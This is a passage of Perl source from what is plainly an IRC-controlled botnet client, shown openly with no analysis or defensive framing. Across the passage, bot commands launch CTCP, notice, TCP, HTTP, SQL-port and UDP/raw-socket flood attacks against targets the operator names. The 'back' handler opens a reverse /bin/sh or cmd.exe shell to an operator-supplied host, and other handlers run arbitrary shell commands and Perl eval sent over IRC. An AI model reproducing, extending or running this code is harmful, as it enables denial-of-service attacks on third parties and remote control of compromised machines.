# ctcpflood, @ctcpflood <who>
#
if ($funcarg =~ /^ctcpflood (.*)/) {
#
   for($i=0; $i<=10; $i+=1){
#
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
#
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3CTCPFlood12]14 Excecuted on ".$1." ");
#
}     
#
# noticeflood, @noticeflood <who>
#
   if ($funcarg =~ /^noticeflood (.*)/) {
#
      for($i=0; $i<=10; $i+=1){
#
         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n");
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3NoticeFlood12]14 Excecuted on ".$1." ");
#
}     
#
# Channel Flood, @channelflood
#
if ($funcarg =~ /^channelflood/) {
#
   for($i=0; $i<=25; $i+=1){
#
      sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) );
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3ChannelFlood12]14 Excecuted ");
#
}
#
# Maxi Flood, @maxiflood
#
if ($funcarg =~ /^maxiflood(.*)/) {
#
   for($i=0; $i<=15; $i+=1){
#
         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFl00D\n");
#
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
#
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
#
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :w3tFl00D\n");         
#
   }
#
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3M4Xi-Fl00d12]14 Excecuted on ".$1." ");
#
}
#
######################
#
#  irc    #
#
######################
#
         if ($funcarg =~ /^reset/) {
#
            sendraw($IRC_cur_socket, "QUIT :");
#
         }
#
         if ($funcarg =~ /^join (.*)/) {
#
            sendraw($IRC_cur_socket, "JOIN ".$1);
#
         }
#
         if ($funcarg =~ /^part (.*)/) {
#
            sendraw($IRC_cur_socket, "PART ".$1);
#
         }
#
         if ($funcarg =~ /^voice (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
#
           }
#
         if ($funcarg =~ /^devoice (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
#
           }
#
         if ($funcarg =~ /^halfop (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
#
           }
#
         if ($funcarg =~ /^dehalfop (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
#
           }
#
         if ($funcarg =~ /^owner (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
#
           }
#
         if ($funcarg =~ /^deowner (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
#
         }
#
         if ($funcarg =~ /^op (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
#
           }         
#
         if ($funcarg =~ /^deop (.*)/) {
#
            sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
#
           }
#
######################
#
#End of Join And Part#
#
######################
#
######################
#
#     TCPFlood       #
#
######################
#
 
#
         if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TCP-DDOS12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");
#
            my $itime = time;
#
            my ($cur_time);
#
            $cur_time = time - $itime;
#
            while ($3>$cur_time){
#
               $cur_time = time - $itime;
#
               &tcpflooder("$1","$2","$3");
#
            }
#
            sendraw($IRC_cur_socket,"PRIVMSG $printl :12[4@3TCP-DDOS12] Attack done 4 ".$1.":".$2.".");
#
         }
#
######################
#
#  End of TCPFlood   #
#
######################
#
######################
#
#    SQL Fl00dEr     #
#
######################
#
if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) {
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking 4 ".$1." 12 on port 3306 for 4 ".$2." 12 seconds .");
#
my $itime = time;
#
my ($cur_time);
#
$cur_time = time - $itime;
#
while ($2>$cur_time){
#
$cur_time = time - $itime;
#
   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
#
   print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
#
close($socket);
#
}
#
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking done 4 ".$1.".");
#
}
#
######################
#
#   Back Connect     #
#
######################
#
         if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
#
            my $host = "$1";
#
            my $porta = "$2";
#
            my $proto = getprotobyname('tcp');
#
            my $iaddr = inet_aton($host);
#
            my $paddr = sockaddr_in($porta, $iaddr);
#
            my $shell = "/bin/sh -i";
#
            if ($^O eq "MSWin32") {
#
               $shell = "cmd.exe";
#
            }
#
            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
#
            connect(SOCKET, $paddr) or die "connect: $!";
#
            open(STDIN, ">&SOCKET");
#
            open(STDOUT, ">&SOCKET");
#
            open(STDERR, ">&SOCKET");
#
            system("$shell");
#
            close(STDIN);
#
            close(STDOUT);
#
            close(STDERR);
#
            if ($estatisticas){
#
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Back-Connect12] Connecting to 4 $host:$porta");
#
            }
#
         }
#
######################
#
#End of  Back Connect#
#
######################
#
######################
#
######################
#
#     HTTPFlood      #
#
######################
#
         if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds .");
#
            my $itime = time;
#
            my ($cur_time);
#
            $cur_time = time - $itime;
#
            while ($2>$cur_time){
#
               $cur_time = time - $itime;
#
               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
#
               print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
#
               close($socket);
#
            }
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking done 4 ".$1.".");
#
         }
#
######################
#
#  End of HTTPFlood  #
#
######################
#
######################
#
#     UDPFlood       #
#
######################
#
         if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3UDP DDoS12:.4|12 Attacking 4 ".$1." 12 with 4 ".$2." 12 Kb Packets for 4 ".$3." 12 seconds.");
#
            my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
#
            $dtime = 1 if $dtime == 0;
#
            my %bytes;
#
            $bytes{igmp} = $2 * $pacotes{igmp};
#
            $bytes{icmp} = $2 * $pacotes{icmp};
#
            $bytes{o} = $2 * $pacotes{o};
#
            $bytes{udp} = $2 * $pacotes{udp};
#
            $bytes{tcp} = $2 * $pacotes{tcp};
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP-DDos12]12 12Results4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12Kb in4 ".$dtime." 12seconds to4 ".$1.".");
#
         }
#
######################
#
#  End of Udpflood   #
#
######################
#
         exit;
#
      }
#
   }
#
 
#
sub ircase {
#
   my ($kem, $printl, $case) = @_;
#
   if ($case =~ /^join (.*)/) {
#
      j("$1");
#
   }
#
   if ($case =~ /^part (.*)/) {
#
      p("$1");
#
   }
#
   if ($case =~ /^rejoin\s+(.*)/) {
#
      my $chan = $1;
#
      if ($chan =~ /^(\d+) (.*)/) {
#
         for (my $ca = 1; $ca <= $1; $ca++ ) {
#
            p("$2");
#
            j("$2");
#
         }
#
      } else {
#
         p("$chan");
#
         j("$chan");
#
      }
#
   }
#
 
#
   if ($case =~ /^op/) {
#
      op("$printl", "$kem") if $case eq "op";
#
      my $oarg = substr($case, 3);
#
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
#
   }
#
 
#
   if ($case =~ /^deop/) {
#
      deop("$printl", "$kem") if $case eq "deop";
#
      my $oarg = substr($case, 5);
#
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
#
   }
#
 
#
   if ($case =~ /^msg\s+(\S+) (.*)/) {
#
      msg("$1", "$2");
#
   }
#
 
#
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
#
      for (my $cf = 1; $cf <= $1; $cf++) {
#
         msg("$2", "$3");
#
      }
#
   }
#
 
#
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
#
      ctcp("$1", "$2");
#
   }
#
 
#
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
#
      for (my $cf = 1; $cf <= $1; $cf++) {
#
         ctcp("$2", "$3");
#
      }
#
   }
#
 
#
   if ($case =~ /^nick (.*)/) {
#
      nick("$1");
#
   }
#
 
#
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
#
      conectar("$2", "$1", 6667);
#
   }
#
 
#
   if ($case =~ /^raw (.*)/) {
#
      sendraw("$1");
#
   }
#
 
#
   if ($case =~ /^eval (.*)/) {
#
      eval "$1";
#
   }
#
}
#
 
#
sub get_html() {
#
$test=$_[0];
#
 
#
      $ip=$_[1];
#
      $port=$_[2];
#
 
#
my $req=HTTP::Request->new(GET=>$test);
#
my $ua=LWP::UserAgent->new();
#
if(defined($ip) && defined($port)) {
#
      $ua->proxy("http","http://$ip:$port/");
#
      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
#
}
#
$ua->timeout(1);
#
my $response=$ua->request($req);
#
if ($response->is_success) {
#
   $re=$response->content;
#
}
#
return $re;
#
}
#
 
#
sub addproc {
#
 
#
   my $proc=$_[0];
#
   my $dork=$_[1];
#
   
#
   open(FILE,">>/var/tmp/pids");
#
   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
#
   close(FILE);
#
}
#
 
#
 
#
sub delproc {
#
 
#
   my $proc=$_[0];
#
   open(FILE,"/var/tmp/pids");
#
 
#
   while(<FILE>) {
#
      $_ =~ /(\d+)\s+(.*)/;
#
      $childs{$1}=$2;
#
   }
#
   close(FILE);
#
   delete($childs{$proc});
#
 
#
   open(FILE,">/var/tmp/pids");
#
 
#
   for $klucz (keys %childs) {
#
      print FILE $klucz." ".$childs{$klucz}."\n";
#
   }
#
}
#
 
#
sub shell {
#
   my $printl=$_[0];
#
   my $comando=$_[1];
#
   if ($comando =~ /cd (.*)/) {
#
      chdir("$1") || msg("$printl", "No such file or directory");
#
      return;
#
   } elsif ($pid = fork) {
#
      waitpid($pid, 0);
#
   } else {
#
      if (fork) {
#
         exit;
#
      } else {
#
         my @resp=`$comando 2>&1 3>&1`;
#
         my $c=0;
#
         foreach my $linha (@resp) {
#
            $c++;
#
            chop $linha;
#
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
#
            if ($c == "$linas_max") {
#
               $c=0;
#
               sleep $sleep;
#
            }
#
         }
#
         exit;
#
      }
#
   }
#
}
#
 
#
sub tcpflooder {
#
   my $itime = time;
#
   my ($cur_time);
#
   my ($ia,$pa,$proto,$j,$l,$t);
#
   $ia=inet_aton($_[0]);
#
   $pa=sockaddr_in($_[1],$ia);
#
   $ftime=$_[2];
#
   $proto=getprotobyname('tcp');
#
   $j=0;$l=0;
#
   $cur_time = time - $itime;
#
   while ($l<1000){
#
      $cur_time = time - $itime;
#
      last if $cur_time >= $ftime;
#
      $t="SOCK$l";
#
      socket($t,PF_INET,SOCK_STREAM,$proto);
#
      connect($t,$pa)||$j--;
#
      $j++;
#
      $l++;
#
   }
#
   $l=0;
#
   while ($l<1000){
#
      $cur_time = time - $itime;
#
      last if $cur_time >= $ftime;
#
      $t="SOCK$l";
#
      shutdown($t,2);
#
      $l++;
#
   }
#
}
#
 
#
sub udpflooder {
#
   my $iaddr = inet_aton($_[0]);
#
   my $msg = 'A' x $_[1];
#
   my $ftime = $_[2];
#
   my $cp = 0;
#
   my (%pacotes);
#
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
#
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
#
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
#
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
#
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
#
   return(undef) if $cp == 4;
#
   my $itime = time;
#
   my ($cur_time);
#
   while ( 1 ) {
#
      for (my $porta = 1; $porta <= 65000; $porta++) {
#
         $cur_time = time - $itime;
#
         last if $cur_time >= $ftime;
#
         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
#
         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
#
         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
#
         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
#
         for (my $pc = 3; $pc <= 255;$pc++) {
#
            next if $pc == 6;
#
            $cur_time = time - $itime;
#
            last if $cur_time >= $ftime;
#
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
#
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
#
         }
#
      }
#
      last if $cur_time >= $ftime;
#
   }
#
   return($cur_time, %pacotes);
#
}
#
 
#
sub ctcp {
#
   return unless $#_ == 1;
#
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
#
}
#
 
#
sub msg {
#
   return unless $#_ == 1;
#
   sendraw("PRIVMSG $_[0] :$_[1]");
#
}
#
 
#
sub notice {
#
   return unless $#_ == 1;
#
   sendraw("NOTICE $_[0] :$_[1]");
#
}
#
 
#
sub op {
#
   return unless $#_ == 1;
#
   sendraw("MODE $_[0] +o $_[1]");
#
}
#
 
#
sub deop {
#
   return unless $#_ == 1;
#
   sendraw("MODE $_[0] -o $_[1]");
#
}
#
 
#
sub j {
#
   &join(@_);
#
}
#
 
#
sub join {
#
   return unless $#_ == 0;
#
   sendraw("JOIN $_[0]");
#
}
#
 
#
sub p {
#
   part(@_);
#
}
#
 
#
sub part {
#
   sendraw("PART $_[0]");
#
}
#
 
#
sub nick {
#
   return unless $#_ == 0;
#
   sendraw("NICK $_[0]");
#
}
#
 
#
sub quit {
#
   sendraw("QUIT :$_[0]");
#
}
#
 
#
sub geths(){
#
my $host=$_[0];
#
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
#
return $host;
#
}
#
 
#
sub key(){
#
my $chiave=$_[0];
#
$chiave =~ s/ /\+/g;
#
$chiave =~ s/:/\%3A/g;
#
$chiave =~ s/\//\%2F/g;
#
$chiave =~ s/&/\%26/g;
#
$chiave =~ s/\"/\%22/g;
#
$chiave =~ s/,/\%2C/g;
#
$chiave =~ s/\\/\%5C/g;
#
return $chiave;
#
}
#
 
#
sub query($){
#
my $url=$_[0];
#
$url=~s/http:\/\///;
#
my $host=$url;
#
my $query=$url;
#
my $page="";
#
$host=~s/href=\"?http:\/\///;
#
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
#
$query=~s/$host//;
#
if ($query eq "") {$query="/";};
#
eval {
#
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
#
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
#
my @r = <$sock>;
#
$page="@r";
#
close($sock);
#
};
#
return $page;
#
}
#
 
#
sub unici{
#
my @unici = ();
#
my %visti = ();
#
foreach my $elemento ( @_ )
#
{
#
next if $visti{ $elemento }++;
#
push @unici, $elemento;
#
}   
#
return @unici;
#
}
#
 
#
sub http_query($){
#
my ($url) = @_;
#
my $host=$url;
#
my $query=$url;
#
my $page="";
#
$host =~ s/href=\"?http:\/\///;
#
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
#
$query =~s/$host//;
#
if ($query eq "") {$query="/";};
#
eval {
#
local $SIG{ALRM} = sub { die "1";};
#
alarm 10;
#
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
#
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
#
my @r = <$sock>;
#
$page="@r";
#
alarm 0;
#
close($sock);
#
};
#
return $page;
#
}}
